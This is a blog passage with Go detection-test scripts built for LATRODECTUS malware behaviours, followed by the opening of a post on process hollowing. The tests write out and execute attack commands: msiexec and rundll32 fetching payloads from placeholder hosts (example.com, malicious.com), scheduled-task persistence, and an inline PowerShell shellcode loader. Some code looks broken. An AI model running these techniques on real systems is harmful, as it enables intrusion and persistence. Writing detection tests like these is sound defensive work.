Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } // process starting via WMI with unusual parent for _, parent := range effectiveParents { executeCommand(fmt.Sprintf(\u0026#34;powershell.exe Start-Process -FilePath \u0026#39;C:\\\\Windows\\\\System32\\\\Wbem\\\\WimPrvSE.exe\u0026#39; -ArgumentList \u0026#39;wmic process call create C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#39; -Wait\u0026#34;)) executeCommand(fmt.Sprintf(\u0026#34;powershell.exe Start-Process -FilePath \u0026#39;C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#39; -ArgumentList \u0026#39;/C whoami\u0026#39;\u0026#34;)) } for _, path := range parentPaths { executeCommand(fmt.Sprintf(\u0026#34;powershell.exe Start-Process -FilePath \u0026#39;C:\\\\Windows\\\\System32\\\\Wbem\\\\WimPrvSE.exe\u0026#39; -ArgumentList \u0026#39;wmic process call create %s\\\\cmd.exe\u0026#39; -Wait\u0026#34;, path)) executeCommand(fmt.Sprintf(\u0026#34;powershell.exe Start-Process -FilePath \u0026#39;%s\\\\cmd.exe\u0026#39; -ArgumentList \u0026#39;/C whoami\u0026#39;\u0026#34;, path)) } Endpoint.Stop(101) // UNPROTECTED } the script detects unusual WMI-based process executions when triggered by non-standard parent processes.\nremote file execution via MSIEXEC LATRODECTUS abuses msiexec.exe to execute files hosted n remote WebDAV shares.\nfunc test() { commands := []string{ \u0026#34;msiexec.exe /i http://example.com/test.msi /q\u0026#34;, \u0026#34;msiexec.exe -i http://example.com/test.msi -q\u0026#34;, \u0026#34;msiexec.exe /PaCKagE http://example.com/test.msi /qn\u0026#34;, \u0026#34;msiexec.exe /i http://example.com/test.msi /qn\u0026#34;, \u0026#34;msiexec.exe -i http://example.com/test.msi /quiet\u0026#34;, \u0026#34;msiexec.exe -fv http://example.com/test.msi /quiet\u0026#34;, \u0026#34;msiexec.exe /i http://example.com/test.msi /quiet\u0026#34;, \u0026#34;msiexec.exe /i http://example.com/test.msi /qn /quiet\u0026#34;, \u0026#34;devinit.exe msi-install http://example.com/test.msi\u0026#34;, \u0026#34;msiexec.exe /i http://example.com/test.msi /quiet INSTALLDIR=%LOCALAPPDATA%\u0026#34;, \u0026#34;msiexec.exe /i http://example.com/test.msi transforms=http://example.com/transform.mst /q\u0026#34;, } executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;command execution not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } for _, command := range commands { executeCommand(command) } Endpoint.Stop(101) // UNPROTECTED } the script detects the use of msiexec.exe with remote URLs, which is uncommon. it simulates the downloading + execution of potentially malicious files.\nrundll32 or regsvr32 loaded a DLL from unbacked memory LATRODECTUS loads DLLs from unbacked memory regions, using rundll32.exe or regsvr32.exe. these are commonly abused in DLL side-loading attacks.\nfunc test() { executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;[+] command execution is not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } commands := []string{ \u0026#34;rundll32.exe shell32.dll,Control_RunDLL\u0026#34;, \u0026#34;regsvr32.exe /s /u shell32.dll\u0026#34;, \u0026#34;rundll32.exe shell32.dll,ShellExec_RunDLL\u0026#34;, \u0026#34;rundll32.exe javascript:\\\u0026#34;\\\\..\\\\mshtml,RunHTMLApplication \\\u0026#34;;document.write();Close();\u0026#34;, \u0026#34;regsvr32.exe /s /u javascript:\\\u0026#34;\\\\..\\\\mshtml,RunHTMLApplication \\\u0026#34;;document.write();Close();\u0026#34;, } for _, command := range commands { executeCommand(command) } // simulate DLL loading from unbacked memory dllLoadingCommands := []string{ \u0026#34;rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll\u0026#34;, \u0026#34;regsvr32.exe /s /u http://malicious.com/malicious.dll\u0026#34;, } for _, command := range dllLoadingCommands { executeCommand(command) } Endpoint.Stop(101) // UNprotected } the script detects this advanced evasion technique, where the malware tries to execute code from regions in memory that are not tied to any known executable image.\nnetwork module loaded from suspicious unbacked memory the malware\u0026rsquo;s network modules are sometimes loaded from memory regions that aren\u0026rsquo;t backed by any known executable.\nfunc test() { executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;[+] command execution is not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } // simulating process execution commands := []string{ \u0026#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList \u0026#39;shell32.dll,Control_RunDLL\u0026#39;}\u0026#34;, \u0026#34;powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList \u0026#39;/s /u shell32.dll\u0026#39;}\u0026#34;, } for _, command := range commands { executeCommand(command) } // DLL loading from suspicious unbacked memory dllLoadingCommands := []string{ \u0026#34;rundll32.exe shell32.dll,ShellExec_RunDLL http://malicious.com/malicious.dll\u0026#34;, \u0026#34;regsvr32.exe /s /u http://malicious.com/malicious.dll\u0026#34;, } for _, command := range dllLoadingCommands { executeCommand(command) } // exclusion conditions exclusionCommands := []string{ \u0026#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList \u0026#39;--enable-speech-input --enable-media-stream --no-sandbox\u0026#39;}\u0026#34;, \u0026#34;powershell.exe -Command Invoke-Expression -Command {Start-Process regsvr32.exe -ArgumentList \u0026#39;--no-sandbox\u0026#39;}\u0026#34;, } for _, command := range exclusionCommands { executeCommand(command) } Endpoint.Stop(101) // UNPROTECTED } the script detects network-based behaviours of the malware, like unusual memory execution patterns. it can be thought of as an extension of the previous script.\nshellcode execution from low reputation module LATRODECTUS can execute shellcode from modules that have low or unknown reputations.\nfunc test() { executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;command execution not available\u0026#34;) Endpoint.Stop(126) //PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;process execution blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } // loading dll with low/unknown rep dllPath := \u0026#34;C:\\\\Users\\\\Public\\\\lowrep.dll\u0026#34; executeCommand(fmt.Sprintf(\u0026#34;powershell.exe -Command New-Item -Path %s -ItemType File\u0026#34;, dllPath)) // process execution [loading DLL + executing shellcode] commands := []string{ fmt.Sprintf(\u0026#34;powershell.exe -Command Invoke-Expression -Command {Add-Type -TypeDefinition @\\\u0026#34;using System;using System.Runtime.InteropServices;public class Win32{[DllImport(\\\\\\\u0026#34;%s\\\\\\\u0026#34;, SetLastError=true)]public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport(\\\\\\\u0026#34;%s\\\\\\\u0026#34;, SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\\\\\\\u0026#34;kernel32.dll\\\\\\\u0026#34;)]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);public delegate IntPtr GetShellcode();[DllImport(\\\\\\\u0026#34;kernel32.dll\\\\\\\u0026#34;)]public static extern IntPtr CreateThread(IntPtr, lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);public static void Main(){IntPtr hModule = LoadLibrary(\\\\\\\u0026#34;%s\\\\\\\u0026#34;);IntPtr procAddr = GetProcAddress(hModule, \\\\\\\u0026#34;GetShellcode\\\\\\\u0026#34;);GetShellcode shellcode = (GetShellcode)Marshal.GetDelegateForFunctionPointer(procAddr, typeof(GetShellcode));IntPtr addr = shellcode();uint oldProtect;VirtualProtect(addr, (UIntPtr)0x1000, 0x40, out oldProtect);CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out _);}}\\\u0026#34;@;[Win32]::Main()}\u0026#34;, dllPath, dllPath, dllPath), } for _, command := range commands { executeCommand(command) } // exclusions exclusionCommands := []string{ \u0026#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList \u0026#39;--no-sandbox\u0026#39;}\u0026#34;, } for _, command := range exclusionCommands { executeCommand(command) } Endpoint.Stop(101) // UNPROTECTED } func cleanup() { // remove created low reputation DLL file os.Remove(\u0026#34;C:\\\\Users\\\\Public\\\\lowrep.dll\u0026#34;) Endpoint.Say(\u0026#34;[+] cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } the script detects shellcode execution that hides behind seemingly benign or low-profile components.\nVirtualProtect API call from an unsigned DLL LATRODECTUS uses unsigned DLLs to call VirtualProtect, used to change memory permissions in order to execute code.\nfunc test() { executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;[+] command execution is not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } // loading of an unsigned or untrusted DLL by a trusted binary dllPath := \u0026#34;C:\\\\Users\\\\Public\\\\unsigned.dll\u0026#34; executeCommand(fmt.Sprintf(\u0026#34;powershell.exe -Command New-Item -Path %s -ItemType File\u0026#34;, dllPath)) // process execution that involves loading the DLL and calling VirtualProtect API commands := []string{ fmt.Sprintf(\u0026#34;powershell.exe -Command Add-Type -TypeDefinition @\\\u0026#34;using System;using System.Runtime.InteropServices;public class Win32{[DllImport(\\\\\\\u0026#34;%s\\\\\\\u0026#34;, SetLastError=true)]public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport(\\\\\\\u0026#34;%s\\\\\\\u0026#34;, SetLastError=true)]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\\\\\\\u0026#34;kernel32.dll\\\\\\\u0026#34;)]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);public delegate IntPtr GetShellcode();[DllImport(\\\\\\\u0026#34;kernel32.dll\\\\\\\u0026#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);public static void Main(){IntPtr hModule = LoadLibrary(\\\\\\\u0026#34;%s\\\\\\\u0026#34;);IntPtr procAddr = GetProcAddress(hModule, \\\\\\\u0026#34;GetShellcode\\\\\\\u0026#34;);GetShellcode shellcode = (GetShellcode)Marshal.GetDelegateForFunctionPointer(procAddr, typeof(GetShellcode));IntPtr addr = shellcode();uint oldProtect;VirtualProtect(addr, (UIntPtr)0x1000, 0x40, out oldProtect);CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out _);}}\\\u0026#34;@;[Win32]::Main()\u0026#34;, dllPath, dllPath, dllPath), } for _, command := range commands { executeCommand(command) } // exclusion conditions exclusionCommands := []string{ \u0026#34;powershell.exe -Command Invoke-Expression -Command {Start-Process rundll32.exe -ArgumentList \u0026#39;--no-sandbox\u0026#39;}\u0026#34;, } for _, command := range exclusionCommands { executeCommand(command) } Endpoint.Stop(101) // UNPROTECTED } func cleanup() { // remove created unsigned DLL file os.Remove(\u0026#34;C:\\\\Users\\\\Public\\\\unsigned.dll\u0026#34;) Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } the script detects the execution of unsigned DLLs that attemp to modify memory protections. this is a red-flag for many memory-based attacks.\nscheduled task creation by an unusual process LATRODECTUS uses unusual processes, like script interpreters, to create scheduled tasks for persistence.\nfunc test() { // commands that simulate scheduled task creation by various processes commands := []string{ \u0026#34;schtasks.exe /create /tn test_task /tr calc.exe /sc daily /f\u0026#34;, } initialAccessProcesses := []string{ \u0026#34;wscript.exe\u0026#34;, \u0026#34;cscript.exe\u0026#34;, \u0026#34;regsvr32.exe\u0026#34;, \u0026#34;mshta.exe\u0026#34;, \u0026#34;rundll32.exe\u0026#34;, \u0026#34;vbc.exe\u0026#34;, \u0026#34;msbuild.exe\u0026#34;, \u0026#34;wmic.exe\u0026#34;, \u0026#34;cmstp.exe\u0026#34;, \u0026#34;RegAsm.exe\u0026#34;, \u0026#34;installutil.exe\u0026#34;, \u0026#34;RegSvcs.exe\u0026#34;, \u0026#34;msxsl.exe\u0026#34;, \u0026#34;xwizard.exe\u0026#34;, \u0026#34;csc.exe\u0026#34;, \u0026#34;winword.exe\u0026#34;, \u0026#34;excel.exe\u0026#34;, \u0026#34;powerpnt.exe\u0026#34;, \u0026#34;powershell.exe\u0026#34;, } for _, process := range initialAccessProcesses { for _, command := range commands { // initial access process processCmd := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, fmt.Sprintf(\u0026#34;start /B %s\u0026#34;, process)) err := processCmd.Start() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to start initial access process: %s\u0026#34;, process)) Endpoint.Stop(1) // ERROR } time.Sleep(2*time.Second) // check if we can execute commands if !Endpoint.IsAvailable(\u0026#34;schtasks.exe\u0026#34;) { Endpoint.Say(\u0026#34;execution not available\u0026#34;) Endpoint.Stop(126) } // execute scheduled task creation command out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;successfully executed command: %s with initial access process: %s\u0026#34;, command, process)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;execution blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } } // execute unsigned/untrusted executable untrustedCmd := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, \u0026#34;schtasks.exe /create /tn test_task_untrusted /tr calc.exe /sc daily /f\u0026#34;) untrustedCmdOut, untrustedErr := untrustedCmd.CombinedOutput() if untrustedErr != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to execute command: %s\u0026#34;, string(untrustedCmdOut))) Endpoint.Stop(1) } Endpoint.Say(\u0026#34;successfully executed untrusted command\u0026#34;) // execution from commonly abused path abusedPathCmd := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, \u0026#34;schtasks.exe /create /tn test_task_abused_path /tr calc.exe /sc daily /f\u0026#34;) abusedPathCmdOut, abusedPathErr := abusedPathCmd.CombinedOutput() if abusedPathErr != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to execute abused path command: %s\u0026#34;, string(abusedPathCmdOut)) Endpoint.Stop(1) } Endpoint.Say(\u0026#34;successfully executed abused path command\u0026#34;) // execution from mounted device mountedDeviceCmd := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, \u0026#34;schtasks.exe /create /tn test_task_mounted_device /tr calc.exe /sc daily /f\u0026#34;) mountedDeviceCmdOut, mountedDeviceErr := mountedDeviceCmd.CombinedOutput() if mountedDeviceErr != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to execute mounted device command: %s\u0026#34;)) Endpoint.Stop(1) // ERROR } Endpoint.Say(\u0026#34;[+] Successfully executed mounted device command\u0026#34;) Endpoint.Say(\u0026#34;[+] Successfully executed all commands\u0026#34;) Endpoint.Stop(101) // UNPROTECTED } func cleanup() { // Clean up any created files or artifacts exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, \u0026#34;schtasks.exe /delete /tn test_task /f\u0026#34;).Run() exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, \u0026#34;schtasks.exe /delete /tn test_task_untrusted /f\u0026#34;).Run() exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, \u0026#34;schtasks.exe /delete /tn test_task_abused_path /f\u0026#34;).Run() exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, \u0026#34;schtasks.exe /delete /tn test_task_mounted_device /f\u0026#34;).Run() Endpoint.Say(\u0026#34;[+] Cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } the script detects persistence methods like task creation that isn\u0026rsquo;t linked to a typical system management process\npotential self deletion of a running executable the malware can delete its own executable after execution, to evade post-infection forensic analysis.\nfunc test() { executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;[+] command execution is not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } // Simulate execution of a file followed by the rename of its primary file stream executablePath := \u0026#34;C:\\\\Users\\\\Public\\\\self_delete_test.exe\u0026#34; renamedPath := \u0026#34;C:\\\\Users\\\\Public\\\\self_delete_test.exe:delete\u0026#34; executeCommand(fmt.Sprintf(\u0026#34;powershell.exe -Command New-Item -Path %s -ItemType File\u0026#34;, executablePath)) // run executable executeCommand(fmt.Sprintf(\u0026#34;start %s\u0026#34;, executablePath)) // rename primary file stream executeCommand(fmt.Sprintf(\u0026#34;powershell.exe -Command Rename-Item -Path %s -NewName %s\u0026#34;, executablePath, renamedPath)) // check rename action if _, err := os.Stat(renamedPath); os.IsNotExist(err) { Endpoint.Say(\u0026#34;[-] renamed file does not exist\u0026#34;) Endpoint.Stop(101) // UNPROTECTED } Endpoint.Stop(100) // PROTECTED } func cleanup() { // remove the created files os.Remove(\u0026#34;C:\\\\Users\\\\Public\\\\self_delete_test.exe\u0026#34;) os.Remove(\u0026#34;C:\\\\Users\\\\Public\\\\self_delete_test.exe:delete\u0026#34;) Endpoint.Say(\u0026#34;[+] cleanup completed successfully\u0026#34;) Endpoint.Stop(100) // PROTECTED } the script detects attempts to remove running executables from the disk.\nlong-term/high-count of network connections by rundll32 LATRODECTUS uses rundll32.exe to create a high number of network connections [C2 comms or data exfiltration].\nfunc test() { executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;[+] command execution is not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED: Access Denied } } // rundll32.exe creating a PE file in the InetCache folder rundll32Path := \u0026#34;C:\\\\Windows\\\\System32\\\\rundll32.exe\u0026#34; peFilePath := \u0026#34;C:\\\\Users\\\\Public\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\malicious.exe\u0026#34; executeCommand(fmt.Sprintf(\u0026#34;%s /c echo 4D5A \u0026gt; %s\u0026#34;, rundll32Path, peFilePath)) // rundll32.exe making network connections to public IP addresses publicIPs := []string{\u0026#34;8.8.8.8\u0026#34;, \u0026#34;8.8.4.4\u0026#34;} for _, ip := range publicIPs { executeCommand(fmt.Sprintf(\u0026#34;%s /c ping %s\u0026#34;, rundll32Path, ip)) time.Sleep(100 * time.Millisecond) } // long-term and high count of network connections startTime := time.Now() for i := 0; i \u0026lt; 100; i++ { for _, ip := range publicIPs { executeCommand(fmt.Sprintf(\u0026#34;%s /c ping %s\u0026#34;, rundll32Path, ip)) } time.Sleep(10 * time.Millisecond) } duration := time.Since(startTime) if duration.Seconds() \u0026lt; 1 { Endpoint.Say(\u0026#34;[+] Long-term and high count network connection simulation successful\u0026#34;) Endpoint.Stop(100) // PROTECTED } else { Endpoint.Say(\u0026#34;[-] Simulation took too long\u0026#34;) Endpoint.Stop(1) // ERROR } } the script detects abnormal network activity associated with rundll32.exe, especially when the activity involves multiple connections to public IP addresses.\ncommand shell activity started via rundll32 rundll32.exe can be used to launch a command shell, that\u0026rsquo;s then used to execute malicious commands.\nfunc test() { executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;[+] command execution is not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;[-] failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;[+] successfully executed command: %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;[+] process execution was blocked\u0026#34;) Endpoint.Stop(126) // PROTECTED } } // rundll32.exe launching a command shell (cmd.exe) with a malicious command rundll32Path := \u0026#34;C:\\\\Windows\\\\System32\\\\rundll32.exe\u0026#34; cmdPath := \u0026#34;C:\\\\Windows\\\\System32\\\\cmd.exe\u0026#34; rundll32Cmd := fmt.Sprintf(\u0026#34;%s %s\u0026#34;, rundll32Path, cmdPath) executeCommand(rundll32Cmd) // rundll32.exe launching PowerShell with a malicious command powershellPath := \u0026#34;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\u0026#34; rundll32PowershellCmd := fmt.Sprintf(\u0026#34;%s %s\u0026#34;, rundll32Path, powershellPath) executeCommand(rundll32PowershellCmd) Endpoint.Stop(100) // PROTECTED } the script detects suspicious usage of rundll32.exe to initiate command shells, which is uncommon but a potent method of executing further commands.\nconclusion after deep-diving into the code and reverse engineering the malware, i developed a series of Go scripts to detect the key behaviors LATRODECTUS exhibits. the process involved decrypting strings, analyzing how the malware resolves native APIs dynamically, and understanding its payload delivery mechanisms. with these insights, i was able to create detection methods that directly address the tactics used by this malware. the goal wasn’t just to stop it in its tracks but to make sure we’re catching every subtle move it makes. each script is a result of careful analysis, aimed at covering all the gaps this malware might exploit.\n","date":"2024-08-26","permalink":"//localhost:1313/posts/gol0/","section":"","summary":"","tags":[],"title":"goL0: reverse engineering + malware analysis"},{"categories":[],"contents":"if you ever find yourself in between jobs for an extended period of time, remember to take time off from bouncing from constantly worrying to being completely nihilistic. if you can spare the time and energy, it can be quite rewarding to find something that you can totally nerd out on. for me, it was the world of windows malware.\nthis could probably benefit from being part of a series, so i\u0026rsquo;ll keep the contents of this post focused on the title. windows is a vast and strange land, and its architecture is both extremely well-studied and mysterious. there\u0026rsquo;s a lot we know, but also a lot we don\u0026rsquo;t know.\nprocess hollowing, however, is quite well-documented. the inspiration behind this article and the code was this interesting piece by daniel mayer, where he uses the windows .NET profiler to pull over your payload and execute it. the offensive value is intriguing, and i\u0026rsquo;m sure we\u0026rsquo;ll see more research in this area!\nwhat exactly is process hollowing? tl;dr: process hollowing (aka RunPE ) is a method of process injection. what happens is original code + resources of a target process are replaced or removed, leaving behind bare process framework. the hollowed process becomes a host for injected malicious code, which is executed under the guise of a legit process.\nthe WinAPIs required for this are the usual suspects: CreateProcess, NtUnmapViewOfSection, VirtualAllocEx, WriteProcessMemory, SetThreadContext, ResumeThread.\nthe attacker goes about this by launching a legit process (notepad.exe is a basic but popular choice) in a suspended state. this means the process is created but not executing any code.\nwhat happens next is the hollowing: unmapping or deallocating the memory that contains the original executable code of the suspended process. the legitimate \u0026ldquo;content\u0026rdquo; is removed, leaving an empty process structure.\nif the tactic hasn\u0026rsquo;t been detected by this point, the attacker would then inject their own malicious code into the hollowed-out process. this is usually done by allocating memory in the process\u0026rsquo;s address space and copying the malicious code into the space.\nwhen process hollowing is successful, it should appear that a legitimate process is running. in reality, the process is executing the injected malicious code.\ndetecting process hollowing with Go i was preparing for an interview with ${company}, and the topic of writing detections in Go had come up. i hadn\u0026rsquo;t really written much Go at this point, so i thought it would be fun to learn enough about the language to eventually use it to write detection scripts.\nwhy Go, specifically? Go is pretty well known for its performance and implementation of concurrency. process hollowing involves low-level operations on system processes, so being fast and efficient is crucial. the goroutines allow for concurrent operations, like monitoring/testing, without significant overhead (theoretically).\na big plus is that Go supports cross-platform code, so the tests could technically be adapted for a different OS. the standard library is pretty robust, and provided me with a lot of built-in tools that i\u0026rsquo;d use for network communication, file I/O, and system interaction.\na lesser known (to me) advantage of Go is that its statically typed nature and compiled binaries help to create reliable and predictable behaviour. the binaries can be easily deployed without dependencies.\ni also had a lot of fun writing + testing the scripts, because of the memory safety of Go\u0026rsquo;s design and smooth error handling.\nendpoint ${company} discussed using a module called endpoint. essentially, it\u0026rsquo;s a library that facilitates the creation and execution (and reporting) of security tests. it abstracts a lot of the complexities that would be involved when interacting with the system, and provided a consistent interface for performing and reporting on various operations.\ni won\u0026rsquo;t share the code here, but i think it\u0026rsquo;s fair to discuss the key components at work, since the code is public and we\u0026rsquo;ll be discussing the tests i wrote in support of it.\nstart and stop functions: manages the lifecycle of the tests (initialization to cleanup). the execution is kicked off with Start(test fn, clean ...fn) and stopped by Stop(code int).\nthese functions run the test in a separate goroutine (which allows for concurrent execution), implement a timeout mechanism, and make sure the test is cleaned up properly (after providing a status code that signals the end of the test).\nsystem interaction + process management: this module is probably the most important, as it interacts with the OS for tasks like process creation, memory manipulation, and more.\nShell(args []string) (string, error) executes a shell command and returns its output. Write(filename string, contents []byte) error and Read(path string) []byte handle writing data and reading data to/from the filesystem. Remove(path string) bool deletes a file at the specified path (important for cleanup).\nsome more functions include AES256GCMEncrypt(data []byte) ([]byte, []byte, error) and AES256GCMDecrypt(data, key []byte) ([]byte, error), which handle encryption; startDropperChildProcess() and writeIPC(), which start a child process (\u0026ldquo;dropper\u0026rdquo;) and communicate with it via IPC, and more.\nnow, on to the tests!\ncall stack spoofing via synthetic frames call stack spoofing is an attack where the call stack is manipulated to make it appear as if a function was called by legitimate code. used to hide the origin of suspicious API calls, it makes tracing malicious behaviour more difficult.\nthis test attempts to detect when the call stack is artificially altered, which is often a sign of process hollowing (or ROP attacks).\nthe test starts by creating a legitimate process (notepad.exe) as its target. it then allocates memory within the target process and writes a NOP slide as a stand-in for malicious shellcode.\nthe key part 